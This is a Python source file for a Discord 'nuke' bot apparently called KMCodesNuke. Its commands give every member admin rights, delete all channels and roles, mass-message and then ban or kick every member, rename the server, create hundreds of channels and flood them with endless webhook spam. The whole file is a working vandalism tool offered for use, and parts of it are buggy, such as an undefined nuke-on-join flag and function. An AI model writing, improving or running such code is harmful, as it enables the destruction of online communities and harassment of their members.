import json
with open("kingman.json", "r") as f:
    data = json.load(f)
    dtoken = data['token']
    dprefix = data['prefix']
    ddmsg = data['dmsg']
    dgname = data['newguildname']
    dspamsg = data['spammsga']
    dspamsg2 = data['spammsgb']
token = dtoken
prefix = dprefix
dmsg = ddmsg
gname = dgname
spam_messages = [dspamsg, dspamsg2]
channel_names = ["ATTACK", "NICE"]
webhook_usernames = ["POWER BY KMCODES", "3INV"]
kmcodes1_on_join = False
kmcodes1_wait_time = 0
import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
bot = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())

@bot.event
async def on_ready():
  print(f"""
{S.BRIGHT}{C.LIGHTGREEN_EX}KMCodesNuke is ready.{S.NORMAL}
This script is connected to {C.WHITE}{bot.user}.
{C.GREEN}Run {C.WHITE}{prefix}kill {C.GREEN}in any server to kill it.
{C.WHITE}Your bot's oauth2 link is {C.LIGHTBLUE_EX}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot
""")
###########Colorama Config###############
"""
Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
Style: DIM, NORMAL, BRIGHT, RESET_ALL
"""
##########
redcolor = C.RED
greencolor = C.GREEN
yellowcolor = C.YELLOW
bluecolor = C.BLUE
whitecolor = C.WHITE
cyancolor = C.CYAN
###########
####################Nuke#######################################
async def nuke(guild):
  print(f"{whitecolor}KMCodes Kill&Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{greencolor}KMCodes Successfully added admin permissions to all member in {whitecolor}{guild.name}")
  except:
    print(f"{redcolor}Admin permissions added in {whitecolor}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{greencolor}KMCodes Successfully deleted channel {whitecolor}{channel.name}")
    except:
      print(f"{redcolor}Channel {whitecolor}{channel.name} {redcolor}has NOT been deleted.")
  for member in guild.members:
    try:
      try:
          await member.send(dmsg)
          print(f"{greencolor} KMCODES Sent Message to {redcolor}{member.name}")
      except:
          print(f"{bluecolor} I cant Sent Message to {redcolor}{member.name}")
      await member.ban()
      print(f"{greencolor}KMCodes Successfully banned {whitecolor}{member.name}")
    except:
      print(f"{whitecolor}{member.name} {redcolor}has NOT been banned.")
  await guild.edit(name=gname)
  for roles in guild.roles:
      try:
          await roles.delete()
          print(f"{greencolor}KMCodes Successfully DeletedRole {redcolor}{roles.name}")
      except:
          print(f"{redcolor} KMCdes Can't DeleteRole {greencolor}{roles.name}")
          print(f"{bluecolor} KMCodes Successfully Delete All Roles")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{greencolor}KMCODES Kill {guild.name}.")

######################NukeCommandsEND###############################

############Ban All Commadns ##############3
async def banall(guild):
 for member in guild.members:
  try:
      await member.ban()
      print(f"{greencolor}KMCodes Successfully Banned {redcolor}{member.name}")
  except:
      print(f"{redcolor}KMCodes Cant Ban {greencolor} {member.name}")
 print(f"{bluecolor} KMCodes Successfully tyy to ban all members")
###########End BAN ALL Commadns #################
############KICK All Commadns ##############3
async def kickall(guild):
    for member in guild.members:
        try:
            await member.kick()
            print(f"{greencolor}KMCodes Successfully Kicked{redcolor}{member.name}")
        except:
            print(f"{redcolor}KMCodes Can't Kick {greencolor}{member.name}")
    print(f"{bluecolor} KMCodes Successfully tyy to kick all members")
############End Kick All Commadns ##############3
###########Delete ALLChannels Commadns #################
async def dellallch(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{greencolor}KMCodes Successfully DeletedChannel {redcolor}{channel.name}")
        except:
            print(f"{redcolor} KMCdes Can't Delete {greencolor}{channel.name}")
    print(f"{bluecolor} KMCodes Successfully Try To Delete All Channels")
###########EndDelete ALLChannels Commadns #################
###########EndDelete ALLRoles Commadns #################
async def dellallroles(guild):
    for roles in guild.roles:
        try:
            await roles.delete()
            print(f"{greencolor}KMCodes Successfully DeletedRole {redcolor}{roles.name}")
        except:
            print(f"{redcolor} KMCdes Can't DeleteRole {greencolor}{roles.name}")
    print(f"{bluecolor} KMCodes Successfully Delete All Roles")
#############################################################
# dm-all
async def massdm(guild):
    for member in guild.members:
        try:
            await member.send(dmsg)
            print(f"{greencolor} KMCODES Sent Message to {redcolor}{member.name}")
        except:
            print(f"{bluecolor} I cant Sent Message to {redcolor}{member.name}")
###########
##########
@bot.command()
async def dmall(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await massdm(guild)
###########
@bot.command()
async def kill(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
###########

@bot.command()
async def kmban(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await banall(guild)

#######3
@bot.command()
async def kmkick(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await kickall(guild)



#########
@bot.command()
async def kmdch(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await dellallch(guild)

#######
@bot.command()
async def kmdro(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await dellallroles(guild)
##############
@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "kmcodes1")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
#################
@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(kmcodes1_wait_time)
    await kmcodes1(guild)
  else:
    return
####################
@bot.command()
async def spam(ctx , *, message = "KMCodes"):
    webhook = await ctx.channel.create_webhook(name = "kingsmen")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
            await webhook.send(message, username = ctx.author.name)
#####################
@bot.command()
async def spamall(ctx , *, message = "KMCodes"):
    guild = ctx.guild
    webhook = await guild.channel.create_webhook(name = "kingsmen2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
            await webhook.send(message, username = ctx.author.name)
######################
@bot.command()
async def kmccr(ctx, amount = 10, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {whitecolor}[Cannot create channel]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"{C.RED}Ccr Error {whitecolor}[Cannot create channel]")
        return
      except:
        pass


if __name__ == "__main__":
  print(f"""
{S.RESET_ALL}||{redcolor}{S.BRIGHT}██╗  ██╗██╗███╗   ██╗ ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗{S.RESET_ALL}||
{S.RESET_ALL}||{redcolor}{S.BRIGHT}██║ ██╔╝██║████╗  ██║██╔════╝ ████╗ ████║██╔══██╗████╗  ██║{S.RESET_ALL}||
{S.RESET_ALL}||{redcolor}{S.BRIGHT}█████╔╝ ██║██╔██╗ ██║██║  ███╗██╔████╔██║███████║██╔██╗ ██║{S.RESET_ALL}||
{S.RESET_ALL}||{redcolor}{S.BRIGHT}██╔═██╗ ██║██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║{S.RESET_ALL}||
{S.RESET_ALL}||{redcolor}{S.BRIGHT}██║  ██╗██║██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║{S.RESET_ALL}||
{S.RESET_ALL}||{redcolor}{S.BRIGHT}╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝{S.RESET_ALL}||
{S.RESET_ALL}                                       {C.BLACK}-Made by kingman-
                       {whitecolor}KINGMAN4HACK&kmcodes
  """)
  try:
    bot.run(token)
  except discord.LoginFailure:
    print(f"{redcolor}Client failed to log in. {whitecolor}[Improper Token Passed]")
  except discord.HTTPException:
    print(f"{redcolor}Client failed to log in. {whitecolor}[Unknown Error]")
